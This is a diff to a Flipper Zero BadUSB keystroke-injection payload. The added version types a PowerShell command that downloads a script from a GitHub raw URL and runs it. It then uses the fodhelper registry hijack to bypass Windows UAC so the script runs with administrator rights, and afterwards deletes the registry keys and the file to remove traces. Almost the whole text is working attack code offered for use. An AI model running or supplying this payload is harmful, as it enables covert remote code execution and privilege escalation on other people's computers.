@@ -1,7 +1,7 @@
-REM Minimal BadUSB Payload for Flipper Zero: Downloads and runs Bluetooth pairing script
+REM Minimal BadUSB Payload for Flipper Zero with UAC Bypass: Downloads script and runs with admin privileges
 
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile '$env:TEMP\badkb.ps1'; & '$env:TEMP\badkb.ps1'"
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile '$env:TEMP\badkb.ps1'; New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''$env:TEMP\badkb.ps1''' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'; Start-Sleep 15; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force; Remove-Item '$env:TEMP\badkb.ps1' -Force"
 ENTER
